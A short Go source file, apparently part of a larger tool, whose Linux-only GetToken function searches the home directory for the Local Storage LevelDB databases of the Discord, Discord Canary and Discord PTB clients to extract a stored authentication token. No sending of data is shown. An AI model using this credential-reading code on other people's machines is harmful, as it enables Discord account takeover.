//+build linux

package token

import (
	"github.com/pkg/errors"
	log "github.com/sirupsen/logrus"
	"os"
	"path/filepath"
)

func GetToken() (tok string, err error) {
	home, def := os.LookupEnv("HOME")
	if !def {
		return "", errors.New("HOME path wasn't specified in environment")
	}

	versions := []string{"discord", "discordcanary", "discordptb"}

	for _, ver := range versions {
		path := filepath.Join(home, ".config", ver, "Local Storage/leveldb")
		log.Debugf("Searching for LevelDB database in %v", path)

		tok, err = searchLevelDB(path)
		if err == nil {
			return
		}
	}

	err = errors.New("Failed to retrieve token from database")
	return
}
